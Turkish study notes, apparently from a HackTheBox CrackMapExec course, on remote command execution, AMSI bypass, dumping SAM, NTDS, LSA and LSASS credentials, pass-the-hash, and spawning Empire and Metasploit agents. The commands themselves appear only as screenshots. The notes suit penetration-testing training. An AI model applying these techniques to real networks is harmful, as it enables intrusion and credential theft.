+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
